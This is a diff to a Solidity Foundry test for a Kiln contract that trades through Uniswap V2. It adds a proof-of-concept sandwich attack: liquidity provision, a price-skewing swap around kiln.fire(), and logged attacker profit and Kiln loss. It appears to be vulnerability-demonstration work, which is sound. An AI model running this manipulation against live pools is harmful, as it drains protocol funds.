@@ -72,8 +72,8 @@ contract KilnTest is Test {
         kiln.file("hop", 6 hours);
     }
 
-    function topUpLiquidity() internal {
-        uint256 daiAmt = 5_000_000 * WAD;
+    function topUpLiquidity(uint256 initialDaiLiquidity) internal {
+        uint256 daiAmt = initialDaiLiquidity > 0 ? initialDaiLiquidity : 5_000_000 * WAD;
         uint256 mkrAmt = 5000 * WAD;
 
         uint reserveA;
@@ -84,8 +84,10 @@ contract KilnTest is Test {
 
         mkrAmt = daiAmt / (reserveA / reserveB) - 10 * WAD;
 
-        deal(DAI, address(this), daiAmt);
-        deal(MKR, address(this), mkrAmt);
+        // assume initial funder in another address, attacker will be address(this)
+        vm.startPrank(address(123));
+        deal(DAI, address(123), daiAmt);
+        deal(MKR, address(123), mkrAmt);
 
         GemLike(DAI).approve(ROUTER, daiAmt);
         GemLike(MKR).approve(ROUTER, mkrAmt);
@@ -97,10 +99,11 @@ contract KilnTest is Test {
             daiAmt,
             mkrAmt,
             1,
-            address(this),
+            address(123),
             block.timestamp);
 
-        assertGt(GemLike(kiln.pairToken()).balanceOf(address(this)), 0);
+        assertGt(GemLike(kiln.pairToken()).balanceOf(address(123)), 0);
+        vm.stopPrank();
     }
 
     function mintDai(address usr, uint256 amt) internal {
@@ -113,22 +116,130 @@ contract KilnTest is Test {
         assertEq(GemLike(MKR).balanceOf(address(usr)), amt);
     }
 
-    function testFireV2Single() public {
+    function getLiquidityStatus(bool print) public view returns (uint256 reserveDai, uint256 reserveMkr, uint256 price) {
+        (address token0,) = UniswapV2Library.sortTokens(DAI, MKR);
+        (uint reserve0, uint reserve1,) = UniswapV2PairLike(kiln.pairToken()).getReserves();
+        reserveDai = DAI == token0 ? reserve0 : reserve1;
+        reserveMkr = DAI == token0 ? reserve1 : reserve0;
+        price = reserveDai / reserveMkr;
+
+        if (print) console.log("liquidity status %s dai, %d mkr, price %s", reserveDai / WAD, reserveMkr / WAD, price);
+    }
+
+    function trade(bool buyMkr, uint256 amount) public returns (uint256 swapped) {
+        address sell = buyMkr ? DAI : MKR;
+        address buy = buyMkr ? MKR : DAI;
+
+        GemLike(sell).approve(ROUTER, amount);
+
+        address[] memory _path = new address[](2);
+        _path[0] = sell;
+        _path[1] = buy;
+
+        uint256[] memory amounts = UniswapRouterV2Like(ROUTER).swapExactTokensForTokens(
+            amount,           // amountIn
+            0,                // amountOutMin
+            _path,            // path
+            address(this),    // to
+            block.timestamp); // deadline
+
+        swapped = amounts[amounts.length - 1];
+    }
+
+    // sum up all kiln funds - in the contract and in the reaceiver
+    function getKilnTotal(address receiver) public returns (uint256 kilnTotal) {
+        uint256 kilnDai = GemLike(DAI).balanceOf(address(kiln));
+        uint256 kilnMKRr = GemLike(MKR).balanceOf(address(kiln));
+
+        (uint256 reserveDai, uint256 reserveMkr, uint256 fairPrice) = getLiquidityStatus(false);
+        uint256 totalLp = GemLike(kiln.pairToken()).totalSupply();
+        uint256 currentLp = GemLike(kiln.pairToken()).balanceOf(receiver);
+
+        kilnTotal = kilnDai +
+                    kilnMKRr * fairPrice +
+                    currentLp * (reserveDai + reserveMkr * fairPrice) / totalLp;
+    }
+
+    function fireV2Single(uint256 initialDaiLiquidity, uint256 depositDai, uint256 skewDai) public {
         mintDai(address(kiln), 100_000 * WAD);
-        topUpLiquidity();
+        topUpLiquidity(initialDaiLiquidity);
 
         assertEq(GemLike(kiln.pairToken()).balanceOf(address(user)), 0);
 
         kiln.file("lot", 20000 * WAD);
 
+        ///////////////// attacker code ///////////////////////
+        console.log("initialDaiLiquidity %s, attacker deposit %s dai, attacker skew %s dai", initialDaiLiquidity / WAD, depositDai / WAD, skewDai / WAD);
+
+        // store kiln initial status, print pool state
+        uint256 kilnInitialTotal = getKilnTotal(address(user));
+        getLiquidityStatus(true);
+
+        // attacker initial funding
+        (,,uint256 fairPrice) = getLiquidityStatus(false);
+        uint256 depositMKR = depositDai / fairPrice;
+        deal(DAI, address(this), (depositDai + skewDai) * 110 / 100);
+        deal(MKR, address(this), depositMKR * 110 / 100);
+
+        uint256 attackerInitialTotal = GemLike(DAI).balanceOf(address(this)) +
+                                       GemLike(MKR).balanceOf(address(this)) * fairPrice;
+
+        // attacker deposits to the pool at fair price to increase his share
+        GemLike(DAI).approve(ROUTER, type(uint256).max);
+        GemLike(MKR).approve(ROUTER, type(uint256).max);
+        (,,uint256 attackerLp) = UniswapRouterV2Like(ROUTER).addLiquidity(MKR, DAI, depositMKR, depositDai, 0, 0, address(this), block.timestamp);
+
+        // attacker skews price
+        uint256 boughtMkr = trade(true, skewDai);
+        getLiquidityStatus(true);
+
+        ////////////////// end attacker code ///////////////////////
+
         kiln.fire();
+
+        //////////////// attacker code ///////////////////////
+
+        // attacker trades back to dai
+        trade(false, boughtMkr);
+
+        // attacker withdraws from the pool
+        GemLike(kiln.pairToken()).approve(ROUTER, attackerLp);
+        UniswapRouterV2Like(ROUTER).removeLiquidity(MKR, DAI, attackerLp, 0, 0, address(this), block.timestamp);
+        getLiquidityStatus(true);
+
+        // final profit and loss calculation
+        uint256 attackerEndTotal = GemLike(DAI).balanceOf(address(this)) +
+                                   GemLike(MKR).balanceOf(address(this)) * fairPrice;
+        console.log("attacker profit %s", (attackerEndTotal - attackerInitialTotal) / WAD);
+
+        uint256 kilnEndTotal = getKilnTotal(address(user));
+        console.log("kiln loss %s", (kilnInitialTotal - kilnEndTotal) / WAD);
+        //////////////// end attacker code ///////////////////////
 
         assertGt(GemLike(kiln.pairToken()).balanceOf(address(user)), 0);
     }
 
+    // block = 16592592, lot 20k, attacker profit 2, kiln loss 105
+    function testFireV2Single5MInitialLiquidity() public {
+        uint256 initialDaiLiquidity = 5_000_000 * WAD; // as originaly set in the test
+        uint256 depositDai          = 60_000_000 * WAD; // this is needed also in MKR
+        uint256 skewDai             = 200_000 * WAD;
+
+        fireV2Single(initialDaiLiquidity, depositDai, skewDai);
+    }
+
+    // block = 16592592, lot 20k, attacker profit 1887, kiln loss 19654
+    function testFireV2Single3MInitialLiquidity() public {
+        uint256 initialDaiLiquidity = 3_000_000 * WAD;
+        uint256 depositDai = 5_000_000 * WAD; // this is needed also in MKR (reasonable)
+        uint256 skewDai    = 500_000_000 * WAD;
+
+        fireV2Single(initialDaiLiquidity, depositDai, skewDai);
+    }
+
     function testFireV2Multi() public {
         mintDai(address(kiln), 100_000 * WAD);
-        topUpLiquidity();
+        topUpLiquidity(0);
 
         assertEq(GemLike(kiln.pairToken()).balanceOf(address(user)), 0);
 
